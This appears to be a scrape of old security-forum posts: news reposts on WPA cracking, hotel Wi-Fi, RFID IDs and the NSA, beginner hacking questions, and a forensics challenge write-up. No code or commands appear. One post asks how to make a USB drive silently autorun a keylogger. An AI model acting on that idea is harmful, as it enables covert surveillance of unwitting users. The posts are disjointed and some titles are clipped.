quantities of computer data and network communications. theoretically, it is possible to conduct devastating intelligencegathering operations, even on highly sensitive political and military communications, remotely from anywhere in the world. cheap and effective, propaganda is often both the easiest and the most powerful cyber attack. digital information, in text or image format –and regardless of whether it is true – can be instantly copied and sent anywhere in the world, even deep behind enemy lines. and provocative information that is removed from the web may appear on another website in seconds. the simple strategy behind a dos attack is to deny the use of a computer resource to legitimate users. the most common tactic is to flood the target with so much superfluous data that it cannot respond to real requests for services or information. other dos attacks include physical destruction of computer hardware and the use of electromagnetic interference, designed to destroy unshielded electronics via current or voltage surges.3 data modification is extremely dangerous, because a successful attack can mean that legitimate users (human or machine) will make an important decision(s) based on maliciously altered information. such attacks range from website defacement (often referred to as “electronic graffiti,” but which can still carry propaganda or disinformation) to database attacks intended to corrupt weapons or command and control (c2) systems. national critical infrastructures are, like everything else, increasingly connected to the internet. however, because instant response is often required, and because associated hardware may have insufficient computing resources, security may not be robust. the management of electricity may be especially important for national security planners to evaluate, because electricity has no substitute, and all other infrastructures depend on it.4 finally, it is important to note that almost all critical infrastructures are in private hands. much more at: http://www.scmagazineus.com/cyberspace- ... le/115929/ do
1;AutoRun from USBey, i recently came across a very very small 8gb usb flash drive on newegg, a bit bigger than the tip of your pinky and i was trying to think about uses for it.  the security-minded side of my head came out and wondered about using it to automatically install a keylogger or some other proof of concept program like calc.exe or notepad.exe  i did some googling about autorun.inf and apparently the "open" option in autorun.inf files is disabled for removable storage like usb flash drives and only really works with dvds and cds.  granted ill probably never use this for any kind of malicious intentions its turned into a challenge to just see if i can find out how to do it. so my question is.. is such a thing possible?  i heard about incidents where a program on a usb drive was renamed to picture.jpg.exe so the user opens it and the program runs  but i was hoping for no more interaction than simply plugging it in and letting it run on its own. any suggestions, advice or comments would be greatly appreciated
2;Big Bang Machine Set to Start Up Wednesdaym a huge science buff, so pardon the personal interest story. just want to share this with you before the earth collapses in on itself in a massive black hole.   geneva —  its been called an alice in wonderland investigation into the makeup of the universe — or dangerous tampering with nature that could spell doomsday. whatever the case, the most powerful atom-smasher ever built comes online wednesday, eagerly anticipated by scientists worldwide who have awaited this moment for two decades. the multibillion-dollar large hadron collider will explore the tiniest particles and come ever closer to re-enacting the big bang, the theory that a colossal explosion created the universe. the machine at cern, the european organization for nuclear research, promises scientists a closer look at the makeup of matter, filling in gaps in knowledge or possibly reshaping theories. the first beams of protons will be fired around the 17-mile tunnel to test the controlling strength of the worlds largest superconducting magnets. it will still be about a month before beams traveling in opposite directions are brought together in collisions that some skeptics fear could create micro "black holes" and endanger the planet. [britains daily telegraph reported last week that scientitst working on the collider had been receiving death threats, to which university of manchester particle physicist and former rock star brian cox replied, "anyone who thinks the lhc will destroy the world is a tw**."] the project has attracted researchers of 80 nationalities, some 1,200 of them from the united states, which contributed $531 million of the projects price tag of nearly $4 billion. "this only happens once a generation," said katie yurkewicz, spokeswoman for the u.s. contingent at the cern project. "people are certainly very excited." the collider at fermilab outside chicago could beat cern to some discoveries, but the geneva equipment, generating seven times more energy than fermilab, will give it big advantages. the cern collider is designed to push the proton beam close to the speed of light, whizzing 11,000 times a second around the tunnel 150 to 500 feet under the bucolic countryside on the french-swiss border. once the beam is successfully fired counterclockwise, a clockwise test will follow. then the scientists will aim the beams at each other so that protons collide, shattering into fragments and releasing energy under the gaze of detectors filling cathedral-sized caverns at points along the tunnel. cern dismisses the risk of micro black holes, subatomic versions of collapsed stars whose gravity is so strong they can suck in planets and other stars. but the skeptics have filed suit in u.s. district court in hawaii and in the european court of human rights to stop the project. they unsuccessfully mounted a similar action in 1999 to block the relativistic heavy ion collider at the brookhaven national laboratory in new york state. cerns collider has been under construction since 2003, financed mostly by its 20 european member states. the united states and japan are major contributors with observer status in cern. scientists started colliding subatomic particles decades ago. as the machines grew more powerful, the experiments revealed that protons and neutrons — previously thought to be the smallest components of an atom — were made of still smaller quarks and gluons. cern hopes to recreate conditions in the laboratory a split-second after the big bang, teaching them more about "dark matter," antimatter and possibly hidden dimensions of space and time. meanwhile, scientists have found innovative ways to explain the concept in laymans terms. the team working on one of the four major installations in the tunnel — the alice, or "a large ion collider experiment" — produced a comic book featuring carlo the physicist and a girl called alice to explain the machines investigation of matter a split second after the big bang. "we create mini big bangs by bumping two nuclei into each other," carlo explains to alice, who has just followed a rabbit down one of the hole-like shafts at cern. "this releases an enormous amount of energy that liberates thousands of quarks and gluons normally imprisoned inside the nucleus. quarks and gluons then form a kind of thick soup that we call the quark-gluon plasma." the soup cools quickly and the quarks and gluons stick together to form protons and neutrons, the building blocks of matter. that will enable scientists to look for still missing pieces to the puzzle — or lead to the formulation of a new theory on the makeup of matter. kate mcalpine, 23, a michigan state university graduate at cern, has produced the large hadron rap, a video clip that has attracted more than a million views on youtube. "the things that it discovers will rock you in the head," mcalpine raps as she dances in the tunnel and caverns. cern spokesman james gillies said the lyrics are "absolutely scientifically spot on." "its quite brilliant," gillies said. original story: http://www.foxnews.com/story/0,2933,418582,00.html cerns lhc home page: http://lhc.web.cern.ch/lhc/ some kewl pics: http://cdsweb.cern.ch/collection/photos?ln=en do

1;Alright...lright so i want to be a hacker, computer expert, computer guru, and all that other fun stuff. i just got a laptop, and maybe thats what sparked my sudden interest in computers and hacking. now i know most computer specialists and people who love computers use linux, and so i thought that would be my first step towards learning more about comps. the only problem is that when i dled ubuntu, and selected it from the start-up screen, nothing happened. it said it was loading, and then the screen got all colorful.  that was it though. linux didnt start. the comp just like froze on me.  now i have windows vista so maybe that has something to do with it, but any kind of help would be greatly appreciated. oh and where should i start off? should i learn how to program first? should learn some hacking basics?  thanks
2;From the Duh Dept: Study Shows Hotel Wireless Insecureo is it just me, or does this fit into one of those categories of useless spending on studies to prove what is common knowledge? or is the general computing public really that naive about security still? study: hotel network security lacking most u.s hotels are vulnerable to malicious attacks and are "ill prepared" to protect their guests from internet security problems, claims a study published by cornell university. the study, “hotel network security: a study of computer networks in u.s. hotels” examined the security of 147  hotels through surveys, interviews and on-site testing.  “many hotels have flaws in their network topology that allow for exploitation by malicious users, thereby resulting in the loss of privacy for guests,” the study says.  one of the study authors, josh ogle, a cornell university graduate and founder of it services company trivesta, performed on-site testing at 46 hotels in virginia, north carolina, texas, maryland, tennessee and pennsylvania - making sure to hit both tourist and business travel destinations. ogle tested wireless networks at 38 hotels and wired networks at eight.  he found the majority were vulnerable to attacks. “out of the 38  wireless, i was able to break into 33,” ogle told scmagazineus.com monday. “and by break into i mean, accept data from someone elses computer that wasnt meant to be on mine.”  ogle used the linux distribution backtrack, meant for network testing. in addition, following recommendations of hackers on vulnerability mailing list full disclosure, ogle used a high-power wireless card and high-gain omnidirectional antenna to crack the networks. the setup cost less than $100, he said.  ogle said using this method a hacker can see all unencrypted information coming into and leaving the network -- including passwords, email messages and any web pages people are viewing.  of the hotels compromised, each took about 10 minutes to breach. some hotel employees inadvertently assisted in the breach by providing passwords and access instructions.  “they are extremely unsecure,” ogle said of hotel wireless security. “i was very disheartened by what i saw. i wasnt surprised, but i was disheartened.”  ogle recommended that all hotels use wi-fi protected access (wpa) encryption, which requires a password to get on the network and encrypts all data transmitted. of the hotel networks that ogle was not able to crack, the majority used wpa encryption for guests, ogle recommended connecting to the internet using a virtual private network (vpn), having updated anti-virus and firewall software and making sure each secured website starts with “https://” rather than “http://”.  the danger of not securing a hotels network is that a malicious user could gain access to guest information or other confidential files, domenic carmona, director of it at the w dallas-victory hotel, told scmagazineus.com monday.  carmona recommended hotels use wpa encryption as the minimum standard. he also stressed the importance of having a robust set of firewalls that are managed and properly configured, splitting networks, and educating staff of the importance of security standards.  original story: http://www.scmagazineus.com/study-hotel ... le/118819/ do
3;Reading Suggestionsello everyone, i just finished reading hacking, the art of exploitation 2nd edition by jon erickson.   i thought this was a great book that got me started on writing my own exploits.   while i am not planning to go into vulnerability research, i do hope to gain an indepth understanding of exploitation.   as a side goal, i am also hoping to be able to begin extending the metasploit framework with the countless exploits and proofs of concept available out there.   i am trying to figure out what i want to read next, and i am hoping that you guys can offer some advice and opinions.  while reading the book, i got a refresher in c programming, which i havent done much since college.   i am pretty confident in my c and c++ programming knowledge at this point.   however, i am severely lacking in assembly and understanding of the intel architecture.   can someone recommend their favorite assembly book for intel architecture? also, this book concentrated on nix and its method of memory management.  all of the sample exploits pertained to sample linux programs.   windows is a bit different and has its own libraries.  is there a similar publication that deals more with the windows architecture, its memory management and stack defense methods, from a hackers perspective? thank you in advance
1;Soon to be release a tool to crack WPA !!!ool to crack wi-fis wpa will appear next weekâ   11.07.08  â  total posts: 1  by mario morejon two researchers from the technical university of darmstadt, germany, have discovered a method of bypassing the wi-fi protected access (wpa) encryption used by many wireless routers.  the exploit takes advantage of a weakness on networks that use wpa with tkip (temporal key integrity protocol, a security algorithm based on key switching that is used to strengthen the wpa encryption) by circumventing the algorithm that encrypts the wi-fi data packets. researchers erik tews and martin beck, who are members of the ethical hacking group known as aircrack-ng, have not only discovered how to bypass wpa, theyve also created a tool to do so. they plan to release the tool at the pacsec conference next week in tokyo, japan, aircrack-ng member rick farina confirmed to pc magazine on friday.  with the exploit tool in hand, hackers will be able break into networks that have wpa with tkip encryption. tkip is a predecessor of aes and was developed to overcome the flaw with wep [wired equivalent private] security. wpa is essentially wep with a couple of fixes. the tkip algorithm rotates keys between clients and access points after enough packets pass between them. by default, most routers on the market change the keys every couple of hours. the exploit takes advantage of this data flowing to and from access points and masquerades its packets by inserting its own and passing them to clients. the packet insertion bypasses the countermeasures used by routers can catch the malicious activity. from a computers point of view, the data packets appear to belong to a legitimate access point. according to farina, just seven packets are needed to gain access to a computer.  researchers found it even easier to gain access to wireless networks that are using qos [quality of service]. networks that mix data and voice packets often rely on qos to prioritize the voice data. however, data packets with qos are rearranged in sequential order so that they travel faster and are received efficiently. the protection algorithm used by tkip was relaxed to allow for qos.  as the exploit tool gains access to a computer, hackers can easily inject new packets and install and execute tools such as metasploit that can give them permanent access. metasploit is a large toolkit for testing exploits and it uses well known exploits in its arsenal. rick said, "with 2 or 3 packets you can fit most tools in the metasploit toolkit," farina said.  because the exploit is specific, users simply need to change the wpa encryption to work with aes or change it to the much more hardened wpa2. if your router doesnt support wpa2, the best course of action is to shorten the timing of the tkip in the routers, so that keys are refreshed every two minutes or less. the fast refresh makes it harder but not impossible for hackers to gain access. the best course of action, however, is to buy a new router that supports wpa2.  the link is from pc world -->http://www.pcmag.com/article2/0,2817,2334150,00.as
3;Why employ a graduate?raduation is near and i am looking to get the ball rolling in the private sector. however as of late i am starting to become worried about why a pen testing company would want to take me on as a junior.  while i have short term work experience in it security and my core skillet is healthy in regard to this field (oscp, ceh + required fundamentals), i struggle to see why i am of value in relation to the available pool of cvs (cost aside). this alone may make one seem unemployable but i am trying to be realistic.. for example, on one of my test labs i was struggling with linux local privilege escalation.. now i know the box is weak in terms of user credentials so i wanted to take another route..i dug up poc for a kernel based pe exploit however i struggled to truly understand its inner workings, even with my intimidate programming skills and ability to write various exploits.. i guess what im trying to say is that the gap between my knowledge and those with years of experience in the field seems so vast.. i understand that graduates are thought to possess accelerated learning capabilities and remain cheap but if the knowledge gaps are so wide, what is their applicable value? while im sure there are employed pen testers out there with a lesser knowledge base than my own, i just dont feel as attractive as id like to the employer. so to reform as a question, can those with experience see a flaw in my thinking in regard to entry level positions? why if at all are young graduates who meet set requirements attractive to pen testing employers? im aware this wall of text is frightful so any responses would be truly appreciated. kind regards, be
1;Exploitshis may be a stupid question. i understand the concept of how exploits work.  but, if you need a exploit for the computer(pen test) youre trying to get into. do you search google for an exploit, and alter the code to fit your needs? or do you write it on your own from start to finish? metasploit aside. sorry for the noob question, i just wanted to know
2;The Julie Amero Case: A Dangerous Farcehis write-up by robert x. cringely of infoworld is a great summary of the events with llinks to more info. after working at an educational institution albeit a university, i saw this kind of cluelessness daily. its amazing how the technology of our brave new world is not in the least bit understood by the masses who use it. im not expecting people to be able to design a datacenter or manage an enterprise network, but knowing at least the big picture concepts is not too much to ask... or is it? all i know is that the same type of people who get in trouble, prosecute, try and judge cases et al are the same people who get so easily irritated when us in it try to help them with a little understanding. maybe more cases like this need to be in the headlines to help educate people. or maybe all of this will continue to fall on deaf ears. i cant even say that im hopeful for the next generation and the common thought that all of this will eventually go away when a majority of users grew up with technology. young kids in elementary school, hs and college (unless they are cs students) seem to be as uninformed as my grandmother. see for yourself. try it. go to your daughters, nephews or whatever young family members computer and see how much of it is riddled with spyware. is there any hope? should i not worry, because this keeps us (and as seen in the article even some completely inept techs) employed? let the conversation begin: the julie amero case may be over, but revelations about how it all happened have only just begun. and the truth is both stranger and uglier than you can imagine. cringely has the 411. since i posted my screed last week about julie amero, the  connecticut middle school teacher who almost did hard time because a computer in her classroom was infected with malware , i heard from many cringesters -- including a handful of people with intimate knowledge of the case. whatever you thought of the amero story before, the reality is far, far worse.  it was a perfect storm of almost farcical proportions. almost anything that could go wrong, did go wrong: kids who exaggerated what they saw on julie ameros screen. a school principal who overreacted and called the cops when an administrative rebuke would have been sufficient. an it administrator who was dangerously out of touch. a da who overreached in applying a felony charge to what was at worst a misdemeanor. a police computer forensics "expert" who was anything but, and a defense expert who was even worse. and amero herself, more clueless about technology than the students she was supposed to teach. alex shipp, a security researcher who volunteered to help amero, says the school districts it admin was:  ...an ex-ibmer approaching retirement who appeared to know little about pcs and networks. he let his firewall subscription lapse. he was running a trial version of an anti-virus program (cheyenne) which was bought out by computer associates and discontinued in favor of their product over 6 months earlier. he did not update signatures regularly anyway. from his trial comments, he know little about malware or adware. he knew nothing about pop-ups. to me, it looks like he threw julie to the wolves to cover his failings. security wonks who volunteered to help amero  obtained a ghost image of the computers hard drive but were inexplicably denied access to the full firewall logs. still, that was enough to determine what images were on the pc (no hard-core porn, but a number of nude lesbian scenes) and the malware program that was delivering the pop-ups:  newdotnet . (the team  published its findings here [pdf] .) on that fateful morning in october 2004, amero was searching for new hairstyles on a windows 98 pc described by another security wonk as a "pile of living dog **** with absolutely no protection on it" when the pop-up storm hit. without the complete logs, its impossible to know exactly what triggered the pop-ups. we do know she didnt turn off the machine, a point that was hammered home by the prosecutor throughout the case. meanwhile, ameros defense counsel was suffering from severe health problems, which got worse as the trial dragged on. his own forensics "expert" who was little more than a guy who played with computers as a hobby and got shredded on the stand. per shipp:  i think the police were incompetent. they believed the stories told to them by people with ulterior motives, and made no attempt to look at the digital evidence to see if there was any conflicts.... the police expert witness was a dangerous buffoon. he sent threatening emails to people involved in the pro-bono work, and during the trial made elementary technical errors. ive seen an e-mail sent by the  police expert  to a member of the security team, and it was troubling to say the least. note to residents of connecticut: your tax dollars pay this mans salary. just something to think about. "this case was a total breakdown in jurisprudence," says alex eckleberry, the sunbelt software ceo who helped organize the team of security volunteers. "nobody understood the technology." original story: http://weblog.infoworld.com/robertxcrin ... amero.html do

3;RFIDs Security Problem - Are New Passports and Drivers Licenses Secure?ice read in mits technology review by erica naone: are u.s. passport cards and new state drivers licenses with rfid truly secure? starting this summer, americans will need passports to travel to canada, mexico, bermuda, and the caribbean--unless they have passport cards or one of the enhanced drivers licenses that the states of washington and new york have begun to issue.  valid only for trips by land and sea, these new forms of identification are a convenient, inexpensive option for people who dont need to travel by plane. u.s. passport cards, which were introduced in july, cost about half as much as a full passport, and the extra cost of getting an enhanced drivers license rather than a regular one is even lower. enhanced licenses have been available in washington since january 2008 and in new york since september; other border states, including michiâ­gan, vermont, and arizona, intend to offer them as well. but not everyone is convinced that the new ids are a good idea. the passport card and the enhanced licenses contain radio frequency identification (rfid) tags, which are microchips fitted with antennas. an rfid reader can radio a query to the tag, causing it to return the data it contains--in this case, an identification number that lets customs agents retrieve information about the cardholder from a government database. the idea is that instant access to biographical data, a photo, and the results of terrorist and criminal background checks will help agents move people through the border efficiently. rfid technology, however, has been raising privacy concerns since it was introduced in product labels in the early 2000s.  meanwhile, although experts say that some rfid technologies are quite secure, a university of virginia security researchers analysis of the nxp mifare classic (see hack, november/december 2008), an rfid chip used in fare cards for the public-â­transit systems of â­boston, london, and other cities, has shown that the security of smart cards cant be taken for granted. "i think we are in the growing-pains phase," says johns hopkins university computer science professor avi rubin, a security and privacy researcher. "this happens with a lot of technologies when they are first developed." borderline security the first of the new id cards to be introduced, the federal passport cards and the washington drivers licenses use similar technology, which has been reviewed and approved by the u.s. department of homeland security. the cards rfid devices, called electronic product code (epc) tags, are much like bar codes. the tags are inexpensive and can, in ideal conditions, be read from about 150 feet away--an unusually long range for rfid, says ari juels, director and chief scientist at rsa laboratories in bedford, ma, which collaborated with researchers from the university of washington to evaluate both cards. for complete article: http://www.technologyreview.com/computing/21842/?a=f do

0;Skillz October 08 Winning Entry - Technicalext version below. for pdf and original formatting,  click here . dan roberts 26 october 2008 1. can you figure out who killed dr. wilson, and why? starting with the partial disk image, i recovered a couple of files using foremost (see appendix 1). in addition to these two files, i recovered an e-mail (see appendix 2) by inspecting the strings within the disk image. the identity of the recipient is not clear from the e-mail text, but the base64-encoded file attachment reveals a jpeg photograph of a messy office decorated with anime figurines. the e-mail states that the sender knows the recipient is behind the cheating, and that the photo is proof of this. based on these findings, i suspect that dr. miller is the murderer. he knew that dr. wilson could identify him, and so used his opportunity in the darkened computer room to shut dr. wilson up.. for good. 2. how were the passwords stolen to steal the exams? i suspect the encryption key was stolen using a hardware keylogger. the photo shows packaging for a 256k in-line key logging device in the waste basket of dr. millers office. dr. taylor said that she scanned the pc for various malware, but a hardware keystroke logger would not have been detected with such a scan. 3. can you provide a copy of the cryptography final exam?

heres what she came up with: cryptography final exam answer key answer 1 this is a caesar cipher with an alphabet shift of -10. it works by substituting letters from the normal alphabet (a-z) with an alphabet that has been shifted, like such: abcdefghijklmnopqrstuvwxyz <- the original character klmnopqrstuvwxyzabcdefghij <- translates to the character beneath it the plaintext reads: a long time ago, in a galaxy far, far away it is a period of civil war. rebel spaceships, striking from a hidden base, have won their first victory against the evil galactic empire. during the battle, rebel spies managed to steal secret plans to the empires ultimate weapon, the death star, an armored space station with enough power to destroy an entire planet.  pursued by the empires sinister agents, princess leia races home aboard her starship, custodian of the stolen plans that can save her people and restore freedom to the galaxy this is the prologue to the movie star wars. answer 2 this ciphertext was generated using a vigenere table (a matrix like the one shown below) and a secret key to perform character substitution. abcdefghijklmnopqrstuvwxyz a abcdefghijklmnopqrstuvwxyz b bcdefghijklmnopqrstuvwxyza c cdefghijklmnopqrstuvwxyzab d defghijklmnopqrstuvwxyzabc …and so on… each character of the cipher text is decoded by finding the letter in the matrix where a cipher character along the top and a secret key character down the side intersect. each character of the secret key is used in succession, and repeated until the entire message is decoded. the plaintext reads: shalliloatheyounowparishonerohhearhimchristianwithinmeitstirsmysintheriverohsheswellswithourlousinessallmylifewillendforhimwerealloutofsignsiknowimsortashockedtohearthelordmygodnowwillsavemeohiwillnerbesavedbecauseilivewithsatanonewishtodaythatyoullallprayforthreewhowillmakeitherelate with spaces, this reads: "shall i loathe you now parishioner oh hear him christian within me it stirs my sin the river oh she swells with our lousiness all my life will end for him were all out of signs i know im sorta shocked to hear the lord my god now will save me oh i will ner be saved because i live with satan one wish today that youll all pray for three who will make it here late." these are the words to stairway to heaven, heard when played backwards. answer 3 the parameters listed in the question refer to settings on a wwii german enigma machine. when set properly, this mechanical device decodes the cipher text to read: somebodysetupusthebomb "somebody set us up the bomb".. the immortal words of cats in a.d. 2101 from the game zero wing. all of your base are belong to us! several tools that helped with the decoding: enigma emulator:  http://homepages.tesco.net/~andycarlson ... gma_j.html rot-13 decoder (and more): http://web.forret.com/tools/rot13.asp vigenere decoder:  http://islab.oregonstate.edu/koc/ece575 ... ipher.html 4. also, provide some analysis of velmas incident handling process. what did she do right? what should she have done differently? velma did right in creating a disk image to work from rather than directly manipulating the original media, and she went for the right tools to extract the relevant data. what she could have done differently: firstly, she should not have disturbed the evidence. immediately upon discovering the crime, the proper thing to do would be to clear out and secure the data center and allow qualified law enforcement personnel to properly survey the scene. it also wouldnt hurt to keep the suspects together. supposing she was qualified to conduct a forensic investigation. the pocket knife should have been photographed as found, then tagged and bagged for safe-keeping. two copies of the storage device would have been better: one for archival purposes and another to work from. velma should have used a hashing algorithm like md5 or sha1 to take fingerprints of the media. this could help later in establishing the integrity of the data if used as evidence in court. the pocket knife should probably first undergo a more comprehensive physical examination, such as fingerprinting and dna testing, before anyone diddles with it. by picking it up, velma has contaminated potential evidence. the device should have been operated in a controlled environment to avoid possible damage. optimal conditions would have ensured no blood or other debris would interfere with operation of the usb drive. its hard to know now whether the data was already corrupt, or if blood caused a short, or if the data was corrupted just by clumsy handling. a digital forensic analysis should follow carefully planned procedures, and all steps performed should be documented. digital evidence is often suspect due to the ease of its fabrication and modification, so a methodical approach is crucial in establishing the reliability of the data as evidence. this case is interesting because the murder weapon and digital media are one in the same. velmas missteps and lack of documentation could put the success of a future trial in jeopardy.. not only from the perspective of the data, but also the murder weapon. 5. hey, was i just rick rolled?

3;How to Avoid the WPA Attack Entirelyood write-up found at searchnetworking.com by lisa phifer: the latest crack in wireless internet security, specifically, the wi-fi protected access (wpa) security standard, can threaten the safety of enterprise networks and business-sensitive information or data. last week we explained how to cope with wpa cracks. today we explain how to avoid them altogether, and what the difference is between wep, wpa and wpa2. its been seven years since 802.11s wired equivalent privacy (wep) was cracked. weps first replacement, wi-fi protected access (wpa), has been required of all new wi-fi certified products since late 2003. but last month, reports surfaced about a crack in wpa -- specifically, a new attack against the message integrity check (mic) used by the temporal key integrity protocol (tkip). while this new attack is not a death-knell for wireless local area networks (wlans) using wpa, it is a note-worthy chip in their armor that you can avoid. how we got here  to get a handle on this latest attack, you need to appreciate the differences between wep, wpa, and wpa2, and how wep cracking caused 802.11 standards to evolve. wep uses rc4 to scramble (encrypt) data exchanged between wireless access points (aps) and clients, applying a cyclic redundancy check (crc) checksum to spot errors. anyone can record wep-encrypted packets, but they cannot interpret them without the wep key to decrypt them. unfortunately, attackers quickly learned how to analyze wep-encrypted packets to guess (crack) that key. because the same wep key is used by every client to encrypt every packet sent to a given ap, a cracked key can decrypt all future packets, no matter who sent them. as a result, wep cannot really stop 802.11 data eavesdropping. tkip was created as a quick fix for older aps and clients that were crippled by wep. instead of using the same key to encrypt every packet, tkip uses rc4 with a different key for each packet. these per-packet keys neutralise wep encryption crackers. in addition, tkip uses a keyed message integrity check (mic) to detect packets that are replayed or forged. anyone can send (that is, inject) a tkip-encrypted packet that has been captured and modified, but those packets are dropped because the mic and checksum do not match the data carried by the packet. aps using tkip usually transmit an error report when the first bad mic is received. if a second bad packet arrives within 60 seconds, the ap stops listening for another minute and then "rekeys" the wlan, requiring all clients to start using a new "pairwise master key" to generate both the mic key and those per-packet encryption keys. this plugged the gaping holes left by wep. all wpa-certified products can use tkip and its mic to resist 802.11 data eavesdropping, forgery, and replay attacks. but even back in 2003, the ieee knew there were more efficient and robust ways to provide this security. this is why 802.11i also defines a cipher block chaining message authentication code protocol (ccmp) which uses the advanced encryption standard (aes) to replace tkip and its mic. all wi-fi certified products must now support wi-fi protected access version 2 (wpa2), letting customers choose the right security for their wlan. wpa2-certified aps that talk to older clients may permit either tkip or aes-ccmp, while those with new clients only can insist on aes-ccmp. for full article: http://searchnetworking.techtarget.com. ... k-entirely do

3;PBS The Spy Factoryery cool documentary on pbs. even includes the secret rooms that mirror all telecom traffic to nsa equipment. heres the offical description of the program: tv program description original pbs broadcast date: february 3, 2009 in this program, an eye-opening documentary on the national security agency (nsa) by best-selling author james bamford and emmy award-winning producer scott willis, nova exposes the ultra-secret intelligence agencys role in the failure to stop the 9/11 attacks and the subsequent eavesdropping program that listens in without warrant on millions of american citizens. "the spy factory" is based on bamfords best-selling 2008 book, the shadow factory, praised as "important and disturbing" in the washington post by former senator bob kerrey, who was a member of the 9/11 commission. (read our excerpt.) in this program, nova chronicles the nsas role in eavesdropping both before and after 9/11. drawing on dozens of interviews with agency insiders and probing publicly available sources as well as transcripts of terrorist trials and an fbi chronology of the terrorists movements, nova assembles a detailed picture of events leading up to the 9/11 attacks. the program sheds light on the vital data known inside the nsa but only partly relayed to other agencies. the trove of information the nsa had access to in advance included osama bin ladens now-disconnected direct satellite phone, which the nsa tapped starting in 1996. exclusive footage shows the three-story house in yemen that served as al qaedas communications and logistics headquarters. the nsa was listening in on phone communications to and from the house for years prior to the 9/11 attack. three times the size of the cia and far more secret, the nsa is comprised of top linguists, mathematicians, and technologists trained to decipher all kinds of communicationsâepitomizing the hidden world of high-tech, 21st-century surveillance. to show how this eavesdropping operates, nova follows the trail of just one typical e-mail sent from asia to the u.s. streaming as pulses of light into a fiber-optic cable, it travels across the pacific ocean, coming ashore in california, and finally reaching an at&t facility in san francisco, where the cable is split and the data sent to a secret nsa monitoring room on the floor below. this enables the nsa to intercept not only most asian e-mail messages but also the entire u.s. internal internet traffic. thus, since 9/11, the agency has turned its giant ear inward to monitor the communications of ordinary americans, many of whom are on the governments secret watch list, now more than half-a-million names long. but how effective is this monumental monitoring effort in countering security threats? the nsa is faced with an enormous and ever-expanding archive of phone calls and e-mail messages. many experts in data mining and analysis are skeptical about the value of collecting so much information without the ability to understand it, as it may lead to critical clues being lost in the static. (listen to a podcast about the challenge even powerful computers have in decoding human speech.) among those interviewed on "the spy factory" are former nsa, cia, and fbi analysts and officials, many speaking publicly for the first time. among these is mark rossini, the senior fbi agent in the cias osama bin laden tracking unit. for the first time, rossini tells how intelligence agency turf wars prevented him from notifying his fbi superiors that al qaeda terrorists were heading for the u.s. with valid visas in early 2000. surprisingly, the 9/11 commission never looked closely into the nsas role in the broad intelligence breakdown behind the world trade center and pentagon attacks. if they had, they would have understood the full extent to which the agency had major pieces of the puzzle but never put them together or disclosed their entire body of knowledge to the cia and fbi. traditionally, the nsa didnt share its raw data with those other agencies, an institutionalized reluctance that played a critical role in the failure to stop the 9/11 plotters. (hear from eleanor hill, a former staff director of the house intelligence committee, on the myriad dangers inherent in such a tradition.) in what bamford calls "one of the largest ironies in the history of american intelligence," he notes that weeks before the attacks, the terrorists were staying in a hotel near nsa headquarters in maryland, almost within sight of the office of then-nsa director michael hayden. hayden, who was later appointed director of the cia by president bush, was never held accountable for his agencys failure, and after 9/11 he spearheaded the bush administrations warrantless wiretapping activities in the name of making the nation safe from terrorists. addressing the question, are we any safer now than we were before?, bamford says, "we should have been safe the way it was. nsa had all the information that it needed to stop the 9/11 hijackers. it had laws that allowed it to track the hijackers." bamford adds that those same laws also protected the privacy of ordinary americans in ways that have since vanished.

3;ALL about Wireless Technology & Other Wireless Security Acronyms?ey ppl have you ever confused with wireles aronyms and thinking what that might be ... recently i found a really good post which explaind it all , will be sharing the same with you hear, it may clear things up for some people who get overwhelmed by all the jargon, especially with the recent news hitting the mainstream about wpa being partially cracked. users have every right to be perplexed by wireless security standards. faced by an alphabet soup of aes, radius, wep, wpa, tkip, eap, leap and 802.1x, many users don’t secure their wireless networks at all. now that earlier wireless security standards such as wi-fi protected access and wired equivalent privacy are being cracked, it’s time to examine what all the terms mean and think about changes >> wep (wired equivalent privacy)—the old, original, now discredited wireless security standard. easily cracked.  >> wep 40/128-bit key, wep 128-bit passphrase—see wep. the user key for wep is generally either 40- or 128-bit, and generally has to be supplied as a hexadecimal string.  >> wpa, wpa1—wi-fi protected access. the initial version of wpa, sometimes called wpa1, is essentially a brand name for tkip. tkip was chosen as an interim standard because it could be implemented on wep hardware with just a firmware upgrade.  >> wpa2—the trade name for an implementation of the 802.11i standard, including aes and ccmp.  >> tkip—temporal key integrity protocol. the replacement encryption system for wep. several features were added to make keys more secure than they were under wep.  >> aes—advanced encryption standard. this is now the preferred encryption method, replacing the old tkip. aes is implemented in wpa2/802.11i.  >> dynamic wep (802.1x)—when the wep key/passphrase is entered by a key management service. wep as such did not support dynamic keys until the advent of tkip and ccmp.  >> eap—extensible authentication protocol. a standard authentication framework. eap supplies common functions and a negotiation mechanism, but not a specific authentication method. currently there are about 40 different methods implemented for eap. see wpa enterprise.  >> 802.1x, ieee8021x—the ieee family of standards for authentication on networks. in this context, the term is hopelessly ambiguous.  leap, 802.1x eap (cisco leap)—(lightweight extensible authentication protocol) a proprietary method of wireless lan authentication developed by cisco systems. supports dynamic wep, radius and frequent reauthentication.  >> wpa-psk, wpa-preshared key—use of a shared key, meaning one manually set and manually managed. does not scale with a large network either for manageability or security, but needs no external key management system.  >> radius—remote authentication dial in user service. a very old protocol for centralizing authentication and authorization management. the radius server acts as a remote service for these functions.  wpa enterprise, wpa2 enterprise—a trade name for a set of eap types. products certified as wpa enterprise or wpa2 enterprise will interoperate (eap-tls, eap-ttls/mschapv2, peapv0/eap-mschapv2, peapv1/eap-gtc & eap-sim)  >> wpa-personal, wpa2-personal—see pre-shared key.  wpa2-mixed—support for both wpa1 and wpa2 on the same access point.  >> 802.11i—an ieee standard specifying security mechanisms for 802.11 networks. 802.11i uses aes and includes improvements in key management, user authentication through 802.1x and data integrity of headers.  >> ccmp—counter mode with cipher block chaining message authentication code protocol. an encryption protocol that uses aes.  enjoy
3;SANS 2009 Security Predictionsttp://www.sans.edu/resources/securityl ... ctions.php just two samples, visit the link for some very interesting predictions =) eric cole, secure anchor, offers two security predictions for 2009,     * less reliance on patching this is a tricky one because i am not saying organizations should not patch. patching is critical and still must be done. however, with the window shrinking between when a vulnerability is public and when the exploit is released, organizations will have to deploy other measures to help minimize their impact to exposure. this is further emphasized by seeing more out of cycle critical patches released by vendors, showing that organizations are going to have to do more with desktop lockdown. hardening a client system by not allowing administrator access and removing all unnecessary components are important. two results of organizations being less reliant on patching for their primary protection are more deployments of hips (host based intrusion prevention) and think clients increasing in popularity. thin clients could also take the form of virtual machines where you load a new image every time you start the computer.     * more focus on data, less on the perimeter the perimeter is critical and must be maintained to have a proper level of security; however, the focus needs to be on understanding, mitigating and reducing the risk to critical data. therefore, organizations will put more energy and time against data focused protection. the dlp (data loss prevention) space will have to be redefined since much of 